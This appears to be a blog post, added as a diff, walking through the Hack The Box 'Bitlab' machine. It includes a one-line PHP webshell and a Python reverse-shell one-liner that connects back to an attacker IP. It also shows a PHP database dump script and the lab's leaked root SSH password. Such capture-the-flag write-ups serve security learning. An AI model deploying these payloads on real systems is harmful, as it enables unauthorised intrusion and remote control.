@@ -1,0 +1,489 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Bitlab - Hack The Box</title>
+  <meta name="description" content="Resolution of the Bitlab machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Bitlab - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/bitlab">
+  <meta property="og:description" content="Resolution of the Bitlab machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/bitlab">
+  <meta name="twitter:title" content="Bitlab - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Bitlab machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/bitlab/bitlab-00-934e372a0d1dd0d6be041478148d7a010bb2286d81c698bfdb28cff3a8d4b785.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/bitlab/bitlab-00-934e372a0d1dd0d6be041478148d7a010bb2286d81c698bfdb28cff3a8d4b785.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Bitlab - Hack The Box</h1>
+            <p>Resolution of the Bitlab machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    June 27, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      6 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/bitlab/bitlab-00-934e372a0d1dd0d6be041478148d7a010bb2286d81c698bfdb28cff3a8d4b785.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-00-934e372a0d1dd0d6be041478148d7a010bb2286d81c698bfdb28cff3a8d4b785.png" alt="Bitlab banner" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-00-934e372a0d1dd0d6be041478148d7a010bb2286d81c698bfdb28cff3a8d4b785.png" data-zooming-width="596" data-zooming-height="380">
+</a></p>
+
+<p>Bitlab is a medium level machine based on Linux, the initial approach is heavily based on enumeration, requiring <code class="highlighter-rouge">git knowledge</code>.
+The privilege escalation has two stages, the first one from user www-data to clave and the second one from clave to root.
+This machine has docker containers that runs some services.
+The second stage of the privilege escalation requires a knowledge about <code class="highlighter-rouge">dynamic reverse engineering</code> on Windows executable files.</p>
+
+<h1 id="recon">Recon</h1>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Sat Apr  4 15:18:08 2020 as: nmap -sC -sV -oA bitlab -T4 10.10.10.114</span>
+Nmap scan report <span class="k">for </span>10.10.10.114
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx
+| http-robots.txt: 55 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/<span class="k">*</span>/edit /users /help 
+|_/s/ /snippets/new /snippets/<span class="k">*</span>/edit
+| http-title: Sign <span class="k">in</span> <span class="se">\x</span>C2<span class="se">\x</span>B7 GitLab
+|_Requested resource was http://10.10.10.114/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sat Apr  4 15:18:31 2020 -- 1 IP address (1 host up) scanned in 23.14 seconds</span></code></pre></figure>
+
+<p>On port 80 the server is running a GitLab website:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-01-a58d217768c6e939540f7431a3d4c841dd50261ed7e0e51a4a008a4207f2787b.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-01-a58d217768c6e939540f7431a3d4c841dd50261ed7e0e51a4a008a4207f2787b.png" alt="Bitlab Recon" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-01-a58d217768c6e939540f7431a3d4c841dd50261ed7e0e51a4a008a4207f2787b.png" data-zooming-width="973" data-zooming-height="527">
+</a></p>
+
+<p>The web directory <code class="highlighter-rouge">/help</code> has the following items:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-02-45fd3f8dbb42a8b84efebe692c65ae246c6ec1f2a235e366696b30cb48d62007.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-02-45fd3f8dbb42a8b84efebe692c65ae246c6ec1f2a235e366696b30cb48d62007.png" alt="Bitlab Recon" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-02-45fd3f8dbb42a8b84efebe692c65ae246c6ec1f2a235e366696b30cb48d62007.png" data-zooming-width="453" data-zooming-height="206">
+</a></p>
+
+<p>The <code class="highlighter-rouge">GitLab Login</code> page has the following content:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">javascript</span><span class="p">:(</span><span class="kd">function</span><span class="p">(){</span> <span class="kd">var</span> <span class="nx">_0x4b18</span><span class="o">=</span><span class="p">[</span><span class="dl">"</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x5F</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6E</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x42</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x5F</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x30</span><span class="se">\</span><span class="s2">x30</span><span class="se">\</span><span class="s2">x38</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x78</span><span class="dl">"</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">4</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="p">})()</span></code></pre></figure>
+
+<p>It seems to be a obfuscated javascript, deobfuscating the above content on <a href="https://jsnice.org" target="_blank">https://jsnice.org</a>, the result is:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-03-6ffc754ecf7264dd6656aaa312a7e5b621d2d3f83310426fb69ae47881abf55c.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-03-6ffc754ecf7264dd6656aaa312a7e5b621d2d3f83310426fb69ae47881abf55c.png" alt="Bitlab Recon" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-03-6ffc754ecf7264dd6656aaa312a7e5b621d2d3f83310426fb69ae47881abf55c.png" data-zooming-width="1250" data-zooming-height="499">
+</a></p>
+
+<p>Now it’s possible to login on GitLab as clavis user:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-04-6e8ac44bb78305bf67f4848bb0641784a9e8521bb80792a7ad6057a0635c854a.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-04-6e8ac44bb78305bf67f4848bb0641784a9e8521bb80792a7ad6057a0635c854a.png" alt="Bitlab Recon" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-04-6e8ac44bb78305bf67f4848bb0641784a9e8521bb80792a7ad6057a0635c854a.png" data-zooming-width="1311" data-zooming-height="476">
+</a></p>
+
+<h1 id="exploiting---uploading-a-webshell-through-a-malicious-gitlab-branch">Exploiting - Uploading a webshell through a malicious GitLab branch</h1>
+
+<p>Doing a quick web recon, we noticed that there’s a PostgreSQL connection file:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-05-5fe659aedb75b48c5a67630c80de6f8ea43a61592714cd96c7b52caa99e99853.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-05-5fe659aedb75b48c5a67630c80de6f8ea43a61592714cd96c7b52caa99e99853.png" alt="Bitlab Exploit" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-05-5fe659aedb75b48c5a67630c80de6f8ea43a61592714cd96c7b52caa99e99853.png" data-zooming-width="992" data-zooming-height="381">
+</a></p>
+
+<p>The service is only accessible locally.</p>
+
+<p>Continuing the enumeration though GitLab, we noticed that there’s a file named <code class="highlighter-rouge">index.php</code> located on Deployer’s repository:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-06-b27813730932e39c7f9d745c1db8718d5122fb626ad9e761c385bfb74a4676bd.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-06-b27813730932e39c7f9d745c1db8718d5122fb626ad9e761c385bfb74a4676bd.png" alt="Bitlab Exploit" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-06-b27813730932e39c7f9d745c1db8718d5122fb626ad9e761c385bfb74a4676bd.png" data-zooming-width="1065" data-zooming-height="356">
+</a></p>
+
+<p>This is a <code class="highlighter-rouge">git pull</code> automation routine, there’s a condition that checks if some parameters from the Profile repository are satisfied, then a <code class="highlighter-rouge">git pull</code> is sent to the server. It’s executed on every merge to the master branch.</p>
+
+<p>Knowing this, we can create a malicious branch with a webshell file and merge it with the master branch.</p>
+
+<p>First off, the PHP webshell:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="cp">?&gt;</span></code></pre></figure>
+
+<p>After that we need to upload our PHP webshell and merge with the master branch:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-07-cd94745675a1963bb5705ab8cf93434b4eb2923308c5f328ddf2bb23d4ddbf50.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-07-cd94745675a1963bb5705ab8cf93434b4eb2923308c5f328ddf2bb23d4ddbf50.png" alt="Bitlab Exploit" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-07-cd94745675a1963bb5705ab8cf93434b4eb2923308c5f328ddf2bb23d4ddbf50.png" data-zooming-width="1043" data-zooming-height="351">
+</a></p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-08-b800edce9722d4a3a99d356d7e61e43db38c138b8a90609387760162b660da26.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-08-b800edce9722d4a3a99d356d7e61e43db38c138b8a90609387760162b660da26.png" alt="Bitlab Exploit" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-08-b800edce9722d4a3a99d356d7e61e43db38c138b8a90609387760162b660da26.png" data-zooming-width="715" data-zooming-height="513">
+</a></p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-09-6521677fee39239ac2dfc8de5739a3af0a2d92c7eaea5157eafb28220b73eb15.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-09-6521677fee39239ac2dfc8de5739a3af0a2d92c7eaea5157eafb28220b73eb15.png" alt="Bitlab Exploit" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-09-6521677fee39239ac2dfc8de5739a3af0a2d92c7eaea5157eafb28220b73eb15.png" data-zooming-width="1109" data-zooming-height="438">
+</a></p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-10-1a2afed67e60bb6ba3714ea7e84828e4f6f9f753766b2f4a06db82924a8d9a94.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-10-1a2afed67e60bb6ba3714ea7e84828e4f6f9f753766b2f4a06db82924a8d9a94.png" alt="Bitlab Exploit" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-10-1a2afed67e60bb6ba3714ea7e84828e4f6f9f753766b2f4a06db82924a8d9a94.png" data-zooming-width="851" data-zooming-height="406">
+</a></p>
+
+<p>Done, the uploaded PHP webshell is located at <code class="highlighter-rouge">/profile/shell.php?0=command</code>, we can now execute system commands as www-data user.</p>
+
+<p>To receive a reverse shell connection, we need to send a Python stager and set up our netcat on listening mode:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.37",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-11-fda9c2010a307c8a98c6f039b3b0a4f6f1944b1055474d7cb284aa7ea5e50485.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-11-fda9c2010a307c8a98c6f039b3b0a4f6f1944b1055474d7cb284aa7ea5e50485.png" alt="Bitlab Exploit" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-11-fda9c2010a307c8a98c6f039b3b0a4f6f1944b1055474d7cb284aa7ea5e50485.png" data-zooming-width="452" data-zooming-height="122">
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that authenticates on GitLab, merge the malicious branch to the master branch and spawn an interactive shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/bitlab" target="_blank">Bitlab Exploit</a></p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-12-6c69166c98b54f032885d5db1bf39fabc38abb8c65d6c45b1d7981ad6f9336b1.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-12-6c69166c98b54f032885d5db1bf39fabc38abb8c65d6c45b1d7981ad6f9336b1.png" alt="Bitlab Exploit" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-12-6c69166c98b54f032885d5db1bf39fabc38abb8c65d6c45b1d7981ad6f9336b1.png" data-zooming-width="776" data-zooming-height="424">
+</a></p>
+
+<h1 id="post-exploitation---getting-data-from-docker-containers--reverse-engineering-a-windows-executable">Post Exploitation - Getting data from Docker containers &amp; Reverse engineering a Windows executable</h1>
+
+<p>Enumerating the network, we noticed that there’s some local ports coming from another Docker container and redirected to the machine:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-13-18cd694a990a57ca6c7227a9432fce5c47dc6f69dad32bb716cecda23279ba97.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-13-18cd694a990a57ca6c7227a9432fce5c47dc6f69dad32bb716cecda23279ba97.png" alt="Bitlab Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-13-18cd694a990a57ca6c7227a9432fce5c47dc6f69dad32bb716cecda23279ba97.png" data-zooming-width="698" data-zooming-height="216">
+</a></p>
+
+<p>The <code class="highlighter-rouge">postgresq</code> service is the main target because we already got the credentials during the recon phase. To access the PostgreSQL database, we need to create a .php file to execute a simple query:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nv">$conn</span> <span class="o">=</span> <span class="nb">pg_pconnect</span><span class="p">(</span><span class="s2">"host=localhost dbname=profiles user=profiles password=profiles"</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="s2">"SELECT * FROM profiles"</span><span class="p">);</span> <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">pg_fetch_all</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span><span class="cp">?&gt;</span></code></pre></figure>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-14-64bedcbdd685c9d6c531e071edfef5e414262d920584bc7e524fb069a3792752.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-14-64bedcbdd685c9d6c531e071edfef5e414262d920584bc7e524fb069a3792752.png" alt="Bitlab Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-14-64bedcbdd685c9d6c531e071edfef5e414262d920584bc7e524fb069a3792752.png" data-zooming-width="323" data-zooming-height="204">
+</a></p>
+
+<p>Now we’re logged as <code class="highlighter-rouge">clave</code> user using the password stored on PostgreSQL database!</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-15-5c76effc682a68d21e02322ed087b569298845120c8258716d6b7e3a5df2adf7.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-15-5c76effc682a68d21e02322ed087b569298845120c8258716d6b7e3a5df2adf7.png" alt="Bitlab Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-15-5c76effc682a68d21e02322ed087b569298845120c8258716d6b7e3a5df2adf7.png" data-zooming-width="571" data-zooming-height="156">
+</a></p>
+
+<p>The next step is to escalate our privileges to root user.
+There’s a file named <code class="highlighter-rouge">RemoteConnection.exe</code> on clave’s home, the executable is a PE32 file, in other words, a Windows executable file.</p>
+
+<blockquote>
+  <p>RemoteConnection.exe: PE32 executable (console) Intel 80386, for MS Windows</p>
+</blockquote>
+
+<p>Doing a basic static analysis, we found some strings related to the Windows API:</p>
+
+<blockquote>
+  <p>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</p>
+
+  <p>XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS</p>
+
+  <p>parse</p>
+
+  <p>Access Denied !!</p>
+
+  <p>string too long</p>
+
+  <p>invalid string position</p>
+
+  <p>GetUserNameW</p>
+
+  <p>ADVAPI32.dll</p>
+
+  <p>ShellExecuteW</p>
+
+  <p>SHELL32.dll</p>
+
+  <p>?cout@std@@3V?$basic_os</p>
+</blockquote>
+
+<p>Unfortunelly nothing interesting were found, we need to change our OS in order to reverse engineering this executable.
+A dynamic analysis is necessary, with IDA Pro we can pause the program’s execution and analyze his behavior:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-16-7234060a66dc3717d0f7913903600edd3912bbf15a7f16017c60ca8c814bda1a.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-16-7234060a66dc3717d0f7913903600edd3912bbf15a7f16017c60ca8c814bda1a.png" alt="Bitlab Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-16-7234060a66dc3717d0f7913903600edd3912bbf15a7f16017c60ca8c814bda1a.png" data-zooming-width="1204" data-zooming-height="497">
+</a></p>
+
+<p>Analyzing the assembly instructions, we noticed some interesting strings:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-17-ef9ce9e5b7e1be792fdfbe6dc37dc2aee38876be078b8ccdd1ee4d2932c29d50.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-17-ef9ce9e5b7e1be792fdfbe6dc37dc2aee38876be078b8ccdd1ee4d2932c29d50.png" alt="Bitlab Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-17-ef9ce9e5b7e1be792fdfbe6dc37dc2aee38876be078b8ccdd1ee4d2932c29d50.png" data-zooming-width="1203" data-zooming-height="549">
+</a></p>
+
+<p>After playing with the breakpoints, we found one that freezes the program before his termination. In this section the program tries to open the <code class="highlighter-rouge">Putty</code> file but fails.</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-18-7c845b6d695a837e538ebb1c12d66bb2f5390bb296aa002a38bf53e559e9516c.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-18-7c845b6d695a837e538ebb1c12d66bb2f5390bb296aa002a38bf53e559e9516c.png" alt="Bitlab Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-18-7c845b6d695a837e538ebb1c12d66bb2f5390bb296aa002a38bf53e559e9516c.png" data-zooming-width="1202" data-zooming-height="500">
+</a></p>
+
+<p>Analyzing the hex bytes, we noticed that there’s a messed ASCII string that indicates a <code class="highlighter-rouge">SSH connection</code>:</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-19-56daef9972e648fcf7e27e04aff7798845d6f5ce7e4ca794e311640ca6ebaec5.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-19-56daef9972e648fcf7e27e04aff7798845d6f5ce7e4ca794e311640ca6ebaec5.png" alt="Bitlab Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-19-56daef9972e648fcf7e27e04aff7798845d6f5ce7e4ca794e311640ca6ebaec5.png" data-zooming-width="568" data-zooming-height="161">
+</a></p>
+
+<blockquote>
+  <p>-.s.s.h.</p>
+
+  <p>.r.o.o.</p>
+
+  <p>t.@.g.i.</p>
+
+  <p>t.l.a.b.</p>
+
+  <p>..h.t.b.</p>
+
+  <p>.-.p.w.</p>
+
+  <p>.”.Q.f.</p>
+
+  <p>7.].8.Y.</p>
+
+  <p>S.V…w.</p>
+
+  <p>D.N.F.*.</p>
+
+  <p>[.7.d.?.</p>
+
+  <p>j.&amp;.e.D.</p>
+
+  <p>4.^.”…</p>
+</blockquote>
+
+<p>Removing the dots and newlines we have the string:</p>
+
+<blockquote>
+  <p>ssh root@gitlab.htb -pw “Qf7]8YSV.wDNF*[7d?j&amp;eD4^”</p>
+</blockquote>
+
+<p>Now we can login as root and capture the last flag!</p>
+
+<p><a href="/assets/hackthebox/bitlab/bitlab-20-5c629b0f99c83a9476e3c8689957e2600156111e9ca03bab5e0e92dc4f707df8.png">
+  <img src="/assets/hackthebox/bitlab/bitlab-20-5c629b0f99c83a9476e3c8689957e2600156111e9ca03bab5e0e92dc4f707df8.png" alt="Bitlab Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/bitlab/bitlab-20-5c629b0f99c83a9476e3c8689957e2600156111e9ca03bab5e0e92dc4f707df8.png" data-zooming-width="300" data-zooming-height="98">
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
